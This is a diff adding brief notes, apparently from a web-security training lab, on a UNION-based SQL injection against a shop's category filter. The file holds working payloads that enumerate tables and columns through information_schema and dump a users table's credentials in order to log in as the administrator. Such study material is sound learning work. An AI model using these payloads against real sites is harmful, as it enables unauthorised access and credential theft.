@@ -1,0 +1,12 @@
+SQL injection attack, listing the database contents on non-Oracle databases
+
+END GOAL: log in as the administrator user
+
+determine the name of this table: 'union+select+table_name,null+from+information_schema.tables--
+users_nvgnoi:  username_ryceuy,  password_enlwie
+
+get number of column: /filter?category=Gifts'order+by+3--
+
+'union+select+null,null+FROM+information_schema.columns+WHERE+table_name='users_nvgnoi'--
+'union+select+column_name,null+FROM+information_schema.columns+WHERE+table_name='users_nvgnoi'--
+'union+select+username_ryceuy,password_enlwie+FROM+users_nvgnoi--
